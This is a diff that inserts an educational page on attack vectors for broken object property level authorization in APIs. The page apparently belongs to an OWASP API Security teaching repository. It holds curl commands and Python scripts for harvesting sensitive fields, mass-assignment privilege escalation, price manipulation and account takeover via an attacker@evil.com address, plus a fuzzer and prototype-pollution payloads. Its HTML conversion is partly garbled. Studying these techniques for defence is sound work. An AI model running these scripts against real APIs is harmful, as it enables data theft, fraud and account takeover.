@@ -215,7 +215,752 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>API03: Broken Object Property Level Authorization - Attack Vectors</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding-the-attack-surface">Understanding the Attack Surface</a></li>
+<li><a href="#excessive-data-exposure-attacks">Excessive Data Exposure Attacks</a></li>
+<li><a href="#mass-assignment-attacks">Mass Assignment Attacks</a></li>
+<li><a href="#advanced-attack-scenarios">Advanced Attack Scenarios</a></li>
+<li><a href="#attack-tools-and-automation">Attack Tools and Automation</a></li>
+<li><a href="#detection-and-reconnaissance">Detection and Reconnaissance</a></li>
+</ul>
+
+<h2>Understanding the Attack Surface</h2>
+
+<p>Property-level authorization vulnerabilities exist whenever an API:</p>
+<ul>
+<li>Serializes database models directly without filtering</li>
+<li>Accepts client input without property allowlisting</li>
+<li>Uses the same schema for different user roles</li>
+<li>Relies on client-side filtering for security</li>
+<li>Lacks field-level access control</li>
+</ul>
+
+<h3>Two Primary Attack Categories</h3>
+
+<p>``<code></p>
+<p>┌─────────────────────────────────────────────────┐</p>
+<p>│  EXCESSIVE DATA EXPOSURE                        │</p>
+<p>│  ─────────────────────────                      │</p>
+<p>│  Attacker receives more data than authorized    │</p>
+<p>│  Target: GET, LIST endpoints                    │</p>
+<p>│  Impact: Information disclosure                 │</p>
+<p>└─────────────────────────────────────────────────┘</p>
+
+<p>┌─────────────────────────────────────────────────┐</p>
+<p>│  MASS ASSIGNMENT                                │</p>
+<p>│  ───────────────                                │</p>
+<p>│  Attacker modifies restricted properties        │</p>
+<p>│  Target: POST, PUT, PATCH endpoints             │</p>
+<p>│  Impact: Privilege escalation, data corruption  │</p>
+<p>└─────────────────────────────────────────────────┘</p>
+</code>`<code>
+
+<h2>Excessive Data Exposure Attacks</h2>
+
+<h3>Attack Vector 1: Sensitive Field Harvesting</h3>
+
+<strong>Objective</strong>: Extract sensitive data exposed in API responses
+
+<h4>Attack Steps</h4>
+
+</code>`<code>bash
+<h1>Step 1: Request user profile</h1>
+<p>curl -H "Authorization: Bearer $TOKEN" \</p>
+<p>  https://api.example.com/v1/users/me</p>
+
+<h1>Vulnerable Response:</h1>
+<p>{</p>
+<p>  "id": 123,</p>
+<p>  "name": "John Doe",</p>
+<p>  "email": "john@example.com",</p>
+<p>  "phone": "+1-555-0100",</p>
+<p>  "ssn": "123-45-6789",              ← SENSITIVE</p>
+<p>  "salary": 85000,                    ← SENSITIVE</p>
+<p>  "password_hash": "$2b$12$...",      ← SENSITIVE</p>
+<p>  "api_key": "sk_live_abc123",        ← SENSITIVE</p>
+<p>  "is_admin": false,                  ← SENSITIVE</p>
+<p>  "created_at": "2023-01-15",</p>
+<p>  "last_login_ip": "192.168.1.100"    ← SENSITIVE</p>
+<p>}</p>
+
+<h1>Step 2: Automate data harvesting</h1>
+<p>for id in {1..10000}; do</p>
+<p>  curl -s -H "Authorization: Bearer $TOKEN" \</p>
+<p>    https://api.example.com/v1/users/$id | \</p>
+<p>    jq '{ssn, salary, api_key}' >> harvested_data.json</p>
+<p>done</p>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Mass privacy violation</li>
+<li>❌ Identity theft potential</li>
+<li>❌ Credential theft (API keys, tokens)</li>
+<li>❌ Compliance violations (GDPR, PCI-DSS, HIPAA)</li>
+</ul>
+
+<h3>Attack Vector 2: GraphQL Over-Fetching</h3>
+
+<strong>Objective</strong>: Use GraphQL introspection to discover and fetch all fields
+
+<h4>Attack Steps</h4>
+
+</code>`<code>graphql
+<h1>Step 1: Introspection query to discover fields</h1>
+<p>{</p>
+<p>  __type(name: "User") {</p>
+<p>    fields {</p>
+<p>      name</p>
+<p>      type {</p>
+<p>        name</p>
+<p>      }</p>
+<p>    }</p>
+<p>  }</p>
+<p>}</p>
+
+<h1>Response reveals ALL fields:</h1>
+<p>{</p>
+<p>  "data": {</p>
+<p>    "__type": {</p>
+<p>      "fields": [</p>
+<p>        {"name": "id", "type": {"name": "Int"}},</p>
+<p>        {"name": "name", "type": {"name": "String"}},</p>
+<p>        {"name": "passwordHash", "type": {"name": "String"}},  ← Discoverable!</p>
+<p>        {"name": "apiKey", "type": {"name": "String"}},        ← Discoverable!</p>
+<p>        {"name": "salary", "type": {"name": "Int"}},           ← Discoverable!</p>
+<p>        {"name": "isAdmin", "type": {"name": "Boolean"}}       ← Discoverable!</p>
+<p>      ]</p>
+<p>    }</p>
+<p>  }</p>
+<p>}</p>
+
+<h1>Step 2: Query all sensitive fields</h1>
+<p>{</p>
+<p>  users(first: 100) {</p>
+<p>    edges {</p>
+<p>      node {</p>
+<p>        id</p>
+<p>        name</p>
+<p>        passwordHash</p>
+<p>        apiKey</p>
+<p>        salary</p>
+<p>        isAdmin</p>
+<p>      }</p>
+<p>    }</p>
+<p>  }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Complete schema disclosure</li>
+<li>❌ Access to password hashes</li>
+<li>❌ Credential exposure</li>
+<li>❌ Business intelligence leakage</li>
+</ul>
+
+<h3>Attack Vector 3: Response Interception</h3>
+
+<strong>Objective</strong>: Capture over-exposed data in transit
+
+<h4>Attack Scenario</h4>
+
+</code>`<code>javascript
+<p>// Frontend code attempts to filter sensitive data</p>
+<p>fetch('/api/users/me')</p>
+<p>  .then(res => res.json())</p>
+<p>  .then(data => {</p>
+<p>    // Client-side filtering</p>
+<p>    const {passwordHash, apiKey, ssn, ...publicData} = data;</p>
+<p>    renderProfile(publicData);</p>
+<p>  });</p>
+
+<p>// Attacker intercepts with browser DevTools or proxy:</p>
+<p>// Network tab shows FULL response including:</p>
+<p>// - passwordHash</p>
+<p>// - apiKey</p>
+<p>// - ssn</p>
+<p>// - salary</p>
+</code>`<code>
+
+<strong>Attack Tools</strong>:
+<ul>
+<li>Browser Developer Tools (Network tab)</li>
+<li>Burp Suite</li>
+<li>OWASP ZAP</li>
+<li>mitmproxy</li>
+<li>Fiddler</li>
+</ul>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Client-side filtering is useless</li>
+<li>❌ All transmitted data is accessible</li>
+<li>❌ Mobile app responses can be intercepted</li>
+<li>❌ Man-in-the-middle attacks expose everything</li>
+</ul>
+
+<h3>Attack Vector 4: Pagination-Based Data Scraping</h3>
+
+<strong>Objective</strong>: Enumerate all records to harvest sensitive fields
+
+<h4>Attack Steps</h4>
+
+</code>`<code>python
+<p>import requests</p>
+<p>import json</p>
+
+<p>base_url = "https://api.example.com/v1/users"</p>
+<p>headers = {"Authorization": f"Bearer {token}"}</p>
+<p>all_data = []</p>
+
+<h1>Iterate through pages</h1>
+<p>page = 1</p>
+<p>while True:</p>
+<p>    response = requests.get(</p>
+<p>        f"{base_url}?page={page}&per_page=100",</p>
+<p>        headers=headers</p>
+<p>    )</p>
+<p>    users = response.json()</p>
+    
+<p>    if not users:</p>
+<p>        break</p>
+    
+<p>    # Extract sensitive fields from each user</p>
+<p>    for user in users:</p>
+<p>        all_data.append({</p>
+<p>            'id': user['id'],</p>
+<p>            'email': user['email'],</p>
+<p>            'ssn': user['ssn'],              # Exposed!</p>
+<p>            'salary': user['salary'],        # Exposed!</p>
+<p>            'api_key': user['api_key']       # Exposed!</p>
+<p>        })</p>
+    
+<p>    page += 1</p>
+
+<h1>Save harvested data</h1>
+<p>with open('stolen_data.json', 'w') as f:</p>
+<p>    json.dump(all_data, f)</p>
+
+<p>print(f"Harvested {len(all_data)} user records")</p>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Systematic data exfiltration</li>
+<li>❌ Massive privacy breach</li>
+<li>❌ Competitive intelligence theft</li>
+<li>❌ Enables targeted attacks</li>
+</ul>
+
+<h2>Mass Assignment Attacks</h2>
+
+<h3>Attack Vector 5: Privilege Escalation</h3>
+
+<strong>Objective</strong>: Elevate user privileges by setting admin flags
+
+<h4>Attack Steps</h4>
+
+</code>`<code>bash
+<h1>Step 1: Normal profile update</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -H "Authorization: Bearer $TOKEN" \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{</p>
+<p>    "name": "Updated Name",</p>
+<p>    "email": "new@example.com"</p>
+<p>  }'</p>
+
+<h1>Step 2: Attempt to add is_admin field</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -H "Authorization: Bearer $TOKEN" \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{</p>
+<p>    "name": "Hacker",</p>
+<p>    "email": "hacker@example.com",</p>
+<p>    "is_admin": true,          ← Mass assignment attack</p>
+<p>    "role": "superadmin"       ← Role escalation</p>
+<p>  }'</p>
+
+<h1>Vulnerable server accepts and updates:</h1>
+<p>UPDATE users </p>
+<p>SET name = 'Hacker',</p>
+<p>    email = 'hacker@example.com',</p>
+<p>    is_admin = true,           ← Privilege escalated!</p>
+<p>    role = 'superadmin'        ← Admin access gained!</p>
+<p>WHERE id = 123;</p>
+
+<h1>Step 3: Verify escalation</h1>
+<p>curl -H "Authorization: Bearer $TOKEN" \</p>
+<p>  https://api.example.com/v1/admin/users</p>
+
+<h1>Success! Now accessing admin endpoint</h1>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Complete system compromise</li>
+<li>❌ Access to all user data</li>
+<li>❌ Ability to modify other accounts</li>
+<li>❌ Data deletion or corruption</li>
+</ul>
+
+<h3>Attack Vector 6: Financial Fraud via Price Manipulation</h3>
+
+<strong>Objective</strong>: Modify prices, balances, or transaction amounts
+
+<h4>Attack Steps</h4>
+
+</code>`<code>bash
+<h1>Scenario: E-commerce checkout API</h1>
+
+<h1>Step 1: Add items to cart</h1>
+<p>curl -X POST https://api.example.com/v1/cart/items \</p>
+<p>  -H "Authorization: Bearer $TOKEN" \</p>
+<p>  -d '{</p>
+<p>    "product_id": 456,</p>
+<p>    "quantity": 1</p>
+<p>  }'</p>
+
+<h1>Step 2: Create order (attempt price manipulation)</h1>
+<p>curl -X POST https://api.example.com/v1/orders \</p>
+<p>  -H "Authorization: Bearer $TOKEN" \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{</p>
+<p>    "cart_id": 789,</p>
+<p>    "shipping_address": "123 Main St",</p>
+<p>    "price": 0.01,              ← Mass assignment attack</p>
+<p>    "discount_percent": 99,     ← Manipulate discount</p>
+<p>    "status": "paid",           ← Skip payment</p>
+<p>    "is_verified": true         ← Bypass verification</p>
+<p>  }'</p>
+
+<h1>Vulnerable API accepts price modification</h1>
+<h1>Order created for $0.01 instead of $999.99</h1>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Direct financial loss</li>
+<li>❌ Inventory given away for free</li>
+<li>❌ Revenue manipulation</li>
+<li>❌ Accounting fraud</li>
+</ul>
+
+<h3>Attack Vector 7: Workflow Bypass via Status Manipulation</h3>
+
+<strong>Objective</strong>: Skip approval steps by directly setting status fields
+
+<h4>Attack Steps</h4>
+
+</code>`<code>bash
+<h1>Scenario: Document approval workflow</h1>
+
+<h1>Normal flow: draft → pending → approved</h1>
+<h1>Attacker bypasses by setting status directly</h1>
+
+<p>curl -X POST https://api.example.com/v1/documents \</p>
+<p>  -H "Authorization: Bearer $TOKEN" \</p>
+<p>  -d '{</p>
+<p>    "title": "Malicious Document",</p>
+<p>    "content": "...",</p>
+<p>    "status": "approved",           ← Skip pending review</p>
+<p>    "approved_by": 1,               ← Forge approver</p>
+<p>    "approved_at": "2024-01-17"     ← Forge timestamp</p>
+<p>  }'</p>
+
+<h1>Document appears approved without going through review</h1>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Business logic bypass</li>
+<li>❌ Unauthorized actions appear legitimate</li>
+<li>❌ Audit trail corruption</li>
+<li>❌ Compliance violations</li>
+</ul>
+
+<h3>Attack Vector 8: Account Takeover via Email Modification</h3>
+
+<strong>Objective</strong>: Change email without verification to take over accounts
+
+<h4>Attack Steps</h4>
+
+</code>`<code>bash
+<h1>Step 1: Update victim's email to attacker's email</h1>
+<p>curl -X PUT https://api.example.com/v1/users/456 \</p>
+<p>  -H "Authorization: Bearer $ATTACKER_TOKEN" \</p>
+<p>  -d '{</p>
+<p>    "email": "attacker@evil.com",</p>
+<p>    "email_verified": true        ← Mass assignment bypass</p>
+<p>  }'</p>
+
+<h1>Vulnerable API allows:</h1>
+<h1>1. Email change without verification</h1>
+<h1>2. Setting email_verified flag</h1>
+<h1>3. Potential access to reset password flow</h1>
+
+<h1>Step 2: Trigger password reset to new email</h1>
+<p>curl -X POST https://api.example.com/v1/auth/password-reset \</p>
+<p>  -d '{"email": "attacker@evil.com"}'</p>
+
+<h1>Step 3: Attacker receives reset link for victim's account</h1>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Complete account takeover</li>
+<li>❌ Access to victim's data</li>
+<li>❌ Identity theft</li>
+<li>❌ Financial fraud</li>
+</ul>
+
+<h3>Attack Vector 9: Batch Mass Assignment</h3>
+
+<strong>Objective</strong>: Exploit batch update endpoints to modify multiple restricted properties
+
+<h4>Attack Steps</h4>
+
+</code>`<code>bash
+<h1>Batch user update endpoint</h1>
+<p>curl -X PUT https://api.example.com/v1/users/batch \</p>
+<p>  -H "Authorization: Bearer $TOKEN" \</p>
+<p>  -d '{</p>
+<p>    "users": [</p>
+<p>      {</p>
+<p>        "id": 100,</p>
+<p>        "is_admin": true,</p>
+<p>        "balance": 1000000</p>
+<p>      },</p>
+<p>      {</p>
+<p>        "id": 101,</p>
+<p>        "is_admin": true,</p>
+<p>        "balance": 1000000</p>
+<p>      },</p>
+<p>      {</p>
+<p>        "id": 102,</p>
+<p>        "is_admin": true,</p>
+<p>        "balance": 1000000</p>
+<p>      }</p>
+<p>    ]</p>
+<p>  }'</p>
+
+<h1>Vulnerable batch endpoint updates all fields</h1>
+<h1>Multiple accounts compromised in single request</h1>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>❌ Mass privilege escalation</li>
+<li>❌ Systemic financial fraud</li>
+<li>❌ Widespread data corruption</li>
+<li>❌ Difficult to detect and remediate</li>
+</ul>
+
+<h2>Advanced Attack Scenarios</h2>
+
+<h3>Attack Vector 10: Parameter Pollution</h3>
+
+<strong>Objective</strong>: Exploit parameter handling to inject additional fields
+
+<h4>Attack Techniques</h4>
+
+</code>`<code>bash
+<h1>Technique 1: Array injection</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -d 'name=John&name=Jane&is_admin=true'</p>
+<h1>Some frameworks take last value, some first, some create array</h1>
+
+<h1>Technique 2: Nested object injection</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{</p>
+<p>    "name": "John",</p>
+<p>    "profile": {</p>
+<p>      "bio": "Developer",</p>
+<p>      "is_admin": true          ← Nested mass assignment</p>
+<p>    }</p>
+<p>  }'</p>
+
+<h1>Technique 3: JSON prototype pollution</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -d '{</p>
+<p>    "name": "John",</p>
+<p>    "__proto__": {</p>
+<p>      "isAdmin": true           ← Prototype pollution</p>
+<p>    }</p>
+<p>  }'</p>
+</code>`<code>
+
+<h3>Attack Vector 11: Type Confusion</h3>
+
+<strong>Objective</strong>: Exploit weak typing to inject unexpected values
+
+<h4>Attack Examples</h4>
+
+</code>`<code>bash
+<h1>Sending boolean as string</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -d '{"is_admin": "true"}'      # String "true" might evaluate to true</p>
+
+<h1>Sending number as string</h1>
+<p>curl -X PUT https://api.example.com/v1/products/456 \</p>
+<p>  -d '{"price": "0"}'            # String "0" might convert to 0</p>
+
+<h1>Sending array instead of scalar</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -d '{"role": ["user", "admin"]}'  # Might take first or last</p>
+
+<h1>SQL injection via mass assignment</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -d '{"name": "John", "query": "SELECT * FROM users"}'</p>
+</code>`<code>
+
+<h3>Attack Vector 12: Hidden Field Discovery</h3>
+
+<strong>Objective</strong>: Discover undocumented fields through various methods
+
+<h4>Discovery Techniques</h4>
+
+</code>`<code>bash
+<h1>Method 1: Error messages</h1>
+<p>curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>  -d '{"invalid_field": "test"}'</p>
+
+<h1>Error might reveal valid fields:</h1>
+<h1>"Invalid fields: invalid_field. Valid fields: id, name, email, is_admin, salary"</h1>
+
+<h1>Method 2: API documentation endpoint</h1>
+<p>curl https://api.example.com/v1/swagger.json</p>
+<p>curl https://api.example.com/v1/openapi.json</p>
+<p>curl https://api.example.com/v1/docs</p>
+
+<h1>Method 3: OPTIONS request</h1>
+<p>curl -X OPTIONS https://api.example.com/v1/users/123</p>
+
+<h1>Method 4: Fuzzing common field names</h1>
+<p>for field in is_admin role permission balance salary price; do</p>
+<p>  curl -X PUT https://api.example.com/v1/users/123 \</p>
+<p>    -d "{\"$field\": true}" -w "%{http_code}\n"</p>
+<p>done</p>
+</code>`<code>
+
+<h2>Attack Tools and Automation</h2>
+
+<h3>Automated Mass Assignment Testing</h3>
+
+</code>`<code>python
+<h1>mass_assignment_fuzzer.py</h1>
+<p>import requests</p>
+<p>import json</p>
+
+<h1>Common privilege escalation fields</h1>
+<p>COMMON_FIELDS = [</p>
+<p>    'is_admin', 'isAdmin', 'admin', 'role', 'roles',</p>
+<p>    'is_superuser', 'superuser', 'permissions', 'permission',</p>
+<p>    'is_staff', 'staff', 'is_moderator', 'moderator',</p>
+<p>    'account_type', 'user_type', 'privilege_level',</p>
+<p>    'is_verified', 'verified', 'is_approved', 'approved'</p>
+<p>]</p>
+
+<h1>Common financial fields</h1>
+<p>FINANCIAL_FIELDS = [</p>
+<p>    'balance', 'credit', 'amount', 'price', 'cost',</p>
+<p>    'discount', 'discount_percent', 'total', 'subtotal',</p>
+<p>    'salary', 'wage', 'payment_amount'</p>
+<p>]</p>
+
+<p>def test_mass_assignment(url, token, user_id):</p>
+<p>    headers = {'Authorization': f'Bearer {token}'}</p>
+    
+<p>    # Test privilege fields</p>
+<p>    for field in COMMON_FIELDS:</p>
+<p>        payload = {</p>
+<p>            'name': 'Test User',</p>
+<p>            field: True</p>
+<p>        }</p>
+        
+<p>        response = requests.put(</p>
+<p>            f'{url}/users/{user_id}',</p>
+<p>            headers=headers,</p>
+<p>            json=payload</p>
+<p>        )</p>
+        
+<p>        if response.status_code == 200:</p>
+<p>            print(f'[!] Potential mass assignment: {field}')</p>
+<p>            print(f'    Response: {response.json()}')</p>
+    
+<p>    # Test financial fields</p>
+<p>    for field in FINANCIAL_FIELDS:</p>
+<p>        payload = {</p>
+<p>            'name': 'Test User',</p>
+<p>            field: 999999</p>
+<p>        }</p>
+        
+<p>        response = requests.put(</p>
+<p>            f'{url}/users/{user_id}',</p>
+<p>            headers=headers,</p>
+<p>            json=payload</p>
+<p>        )</p>
+        
+<p>        if response.status_code == 200:</p>
+<p>            print(f'[!] Potential financial manipulation: {field}')</p>
+<p>            print(f'    Response: {response.json()}')</p>
+
+<h1>Usage</h1>
+<p>test_mass_assignment('https://api.example.com/v1', 'your_token', 123)</p>
+</code>`<code>
+
+<h3>Excessive Data Exposure Scanner</h3>
+
+</code>`<code>python
+<h1>data_exposure_scanner.py</h1>
+<p>import requests</p>
+<p>import json</p>
+
+<p>SENSITIVE_KEYWORDS = [</p>
+<p>    'password', 'passwd', 'pwd', 'pass',</p>
+<p>    'secret', 'api_key', 'apikey', 'token',</p>
+<p>    'ssn', 'social_security', 'credit_card', 'cvv',</p>
+<p>    'private_key', 'hash', 'salt',</p>
+<p>    'salary', 'wage', 'compensation',</p>
+<p>    'is_admin', 'role', 'permission'</p>
+<p>]</p>
+
+<p>def scan_endpoint(url, token):</p>
+<p>    headers = {'Authorization': f'Bearer {token}'}</p>
+<p>    response = requests.get(url, headers=headers)</p>
+    
+<p>    if response.status_code == 200:</p>
+<p>        data = response.json()</p>
+<p>        exposed_fields = []</p>
+        
+<p>        def check_fields(obj, path=''):</p>
+<p>            if isinstance(obj, dict):</p>
+<p>                for key, value in obj.items():</p>
+<p>                    full_path = f'{path}.{key}' if path else key</p>
+                    
+<p>                    # Check if field name contains sensitive keywords</p>
+<p>                    for keyword in SENSITIVE_KEYWORDS:</p>
+<p>                        if keyword in key.lower():</p>
+<p>                            exposed_fields.append({</p>
+<p>                                'field': full_path,</p>
+<p>                                'value': value,</p>
+<p>                                'keyword': keyword</p>
+<p>                            })</p>
+                    
+<p>                    # Recurse into nested objects</p>
+<p>                    if isinstance(value, (dict, list)):</p>
+<p>                        check_fields(value, full_path)</p>
+            
+<p>            elif isinstance(obj, list):</p>
+<p>                for i, item in enumerate(obj):</p>
+<p>                    check_fields(item, f'{path}[{i}]')</p>
+        
+<p>        check_fields(data)</p>
+        
+<p>        if exposed_fields:</p>
+<p>            print(f'[!] Excessive data exposure found in {url}')</p>
+<p>            for field in exposed_fields:</p>
+<p>                print(f'    - {field["field"]}: {field["keyword"]}')</p>
+        
+<p>        return exposed_fields</p>
+    
+<p>    return []</p>
+
+<h1>Usage</h1>
+<p>scan_endpoint('https://api.example.com/v1/users/me', 'your_token')</p>
+</code>`<code>
+
+<h2>Detection and Reconnaissance</h2>
+
+<h3>Reconnaissance Checklist</h3>
+
+</code>`<code>
+<p>□ Enumerate API endpoints (docs, swagger, openapi)</p>
+<p>□ Inspect GET responses for sensitive fields</p>
+<p>□ Test OPTIONS/HEAD for field disclosure</p>
+<p>□ Analyze error messages for field names</p>
+<p>□ Review client-side code for field usage</p>
+<p>□ Test GraphQL introspection</p>
+<p>□ Attempt common mass assignment fields</p>
+<p>□ Fuzz parameter names</p>
+<p>□ Test with different user roles</p>
+<p>□ Monitor response sizes for anomalies</p>
+<p>□ Check for prototype pollution vectors</p>
+<p>□ Test batch/bulk endpoints</p>
+<p>□ Analyze websocket messages</p>
+<p>□ Review mobile app traffic</p>
+<p>□ Test file upload metadata</p>
+</code>`<code>
+
+<h3>OWASP ZAP Configuration</h3>
+
+</code>`<code>xml
+<!-- Add custom mass assignment fuzzer -->
+<rule>
+  <name>Mass Assignment Test</name>
+  <attack>
+    <param>is_admin</param>
+    <value>true</value>
+  </attack>
+  <attack>
+    <param>role</param>
+    <value>admin</value>
+  </attack>
+  <attack>
+    <param>balance</param>
+    <value>999999</value>
+  </attack>
+</rule>
+</code>`<code>
+
+<h2>Real-World Attack Timeline</h2>
+
+</code>`<code>
+<p>Hour 0: Attacker discovers API endpoint</p>
+<p>Hour 1: Reconnaissance - map endpoints and fields</p>
+<p>Hour 2: Test for excessive data exposure</p>
+<p>Hour 3: Discover exposed sensitive fields</p>
+<p>Hour 4: Automate data harvesting script</p>
+<p>Hour 5: Test mass assignment vectors</p>
+<p>Hour 6: Achieve privilege escalation</p>
+<p>Hour 7: Access admin endpoints</p>
+<p>Hour 8: Exfiltrate entire database</p>
+<p>Hour 9: Cover tracks, sell data</p>
+
+<p>Total time to breach: Less than 10 hours</p>
+</code>``
+
+<h2>Defensive Indicators</h2>
+
+<p>Signs you may be under attack:</p>
+<ul>
+<li>✓ Unusual parameter names in requests</li>
+<li>✓ Requests with many unexpected fields</li>
+<li>✓ Repeated access to user enumeration endpoints</li>
+<li>✓ Large volume of GET requests to profile endpoints</li>
+<li>✓ Sudden privilege escalations in audit logs</li>
+<li>✓ Unexpected modifications to admin flags</li>
+<li>✓ Anomalous changes to financial fields</li>
+<li>✓ Batch operations with suspicious patterns</li>
+</ul>
+
+<h2>What's Next?</h2>
+
+<ul>
+<li><strong><a href="./prevention.md">Prevention</a></strong>: Learn how to protect against property-level authorization attacks</li>
+<li><strong><a href="./examples.md">Examples</a></strong>: See secure vs vulnerable code implementations</li>
+<li><strong><a href="./lab/api03-mass-assignment-lab/">Lab</a></strong>: Practice exploiting and fixing these vulnerabilities</li>
+</ul>
+
+<p>---</p>
+
+<em>Part of the <a href="../../README.md">OWASP API Security Top 10 Educational Repository</a></em>
+
         </div>
     </div>
 </body>
